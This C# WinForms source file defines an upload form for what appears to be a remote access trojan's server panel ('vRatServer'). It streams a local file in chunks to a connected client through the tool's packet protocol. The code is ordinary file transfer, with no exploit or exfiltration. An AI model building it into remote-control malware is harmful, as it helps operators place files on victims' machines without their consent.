using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Forms
{
    public partial class UploadFile : Form
    {
        string filesize = string.Empty;
        string filen = string.Empty;
        ulong sent = 0;
        bool stop = false;
        ulong myfileid;
        string filepathl;
        Client client;
        public UploadFile(string filesize, string filename, Client client, ulong fileid, string filepathl)
        {
            this.filesize = filesize;
            this.filen = filename;
            this.client = client;
            this.myfileid = fileid;
            this.filepathl = filepathl;
            InitializeComponent();
        }
        public void send_file(Label label2)
        {
            byte[] r = null;
            byte[] rpath = Encoding.Unicode.GetBytes(filen);
            byte[] concatenatedArray1 = rpath.Concat(new byte[] { 0x00, 0x00 }).ToArray();
            
            globals.SendPacket(client, (byte)globals.PacketType.FileManagerFileUpload, rpath.Length + 2, myfileid, ref concatenatedArray1);

            using (FileStream stream = File.OpenRead(filepathl))
            {
                int chunkSize = 5000000;
                byte[] buffer = new byte[chunkSize];
                byte[] concatenatedArray = new byte[chunkSize + 20];
                int bytesRead;

                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) > 0)
                {
          
                    if (globals.SendPacket(client, (byte)globals.PacketType.FileManagerFileUploadData, bytesRead, myfileid, ref buffer)!=0) { break; }
                    sent += (ulong)bytesRead;
                    label2.Text = sent.ToString();
                    if (stop) { break; }

                }

                //end

                globals.SendPacket(client, (byte)globals.PacketType.FileManagerFileUploadData, 0, myfileid, ref r);


            }
        }
        private void UploadFile_Load(object sender, EventArgs e)
        {
            label1.Text = filen;
            label2.Text = sent.ToString();
            label3.Text = filesize;
            ThreadPool.QueueUserWorkItem((state) => this.send_file(label2));
        }

        private void button1_Click(object sender, EventArgs e)
        {
            stop = true;
            button1.Enabled = false;
        }

        private void UploadFile_FormClosed(object sender, FormClosedEventArgs e)
        {
            stop = true;
            button1.Enabled = false;
        }
    }
}
